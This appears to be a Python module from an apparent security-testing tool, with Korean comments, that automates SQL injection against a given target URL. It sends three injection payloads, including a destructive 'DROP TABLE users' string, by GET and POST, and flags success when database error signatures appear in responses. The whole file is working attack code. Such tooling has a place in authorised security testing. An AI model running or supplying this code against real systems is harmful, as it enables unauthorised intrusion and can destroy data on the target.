"""SQL Injection 익스플로잇 executor."""
import logging
from typing import TypedDict

import httpx

logger = logging.getLogger(__name__)

# DB 에러 패턴은 런타임 탐지이므로 상수로 분리
_DB_ERROR_SIGNATURES: tuple[str, ...] = (
    "error in your sql syntax",
    "ora-",
    "mysql_fetch",
    "sqlstate",
    "pg::syntaxerror",
    "unclosed quotation mark",
    "quoted string not properly terminated",
)

_SQLI_PAYLOADS: tuple[str, ...] = (
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL--",
)

_TIMEOUT_SECONDS = 30


class ExploitOutcome(TypedDict):
    success: bool
    payload: str
    response_snippet: str
    evidence: str
    error: str | None


def _contains_db_error(body: str) -> bool:
    """응답 본문에 알려진 DB 에러 패턴이 있는지 확인한다."""
    lower = body.lower()
    return any(sig in lower for sig in _DB_ERROR_SIGNATURES)


async def execute(target_url: str, endpoint: str, params: dict) -> ExploitOutcome:
    """Union-based SQLi 페이로드를 순차적으로 시도하고 결과를 반환한다.

    DB 에러 문자열이 응답에 포함되면 취약점이 반사되었다고 판단한다.
    개별 요청 실패는 다음 페이로드로 넘어가고, 전체 실패 시에만 error를 기록한다.
    """
    url = target_url.rstrip("/") + "/" + endpoint.lstrip("/")
    last_error: str | None = None

    async with httpx.AsyncClient(timeout=_TIMEOUT_SECONDS, follow_redirects=True) as client:
        for payload in _SQLI_PAYLOADS:
            injected_params = {k: payload for k in params} if params else {"q": payload}
            try:
                response = await client.get(url, params=injected_params)
                snippet = response.text[:500]

                if _contains_db_error(response.text):
                    return ExploitOutcome(
                        success=True,
                        payload=payload,
                        response_snippet=snippet,
                        evidence="DB error string found in response body",
                        error=None,
                    )

                # POST도 시도해 폼 기반 엔드포인트를 커버한다
                post_response = await client.post(url, data=injected_params)
                if _contains_db_error(post_response.text):
                    return ExploitOutcome(
                        success=True,
                        payload=payload,
                        response_snippet=post_response.text[:500],
                        evidence="DB error string found in POST response body",
                        error=None,
                    )

            except httpx.HTTPError as exc:
                last_error = str(exc)
                logger.warning("[sqli] request failed endpoint=%s: %s", endpoint, exc)

    return ExploitOutcome(
        success=False,
        payload=",".join(_SQLI_PAYLOADS),
        response_snippet="",
        evidence="No DB error patterns detected in any response",
        error=last_error,
    )
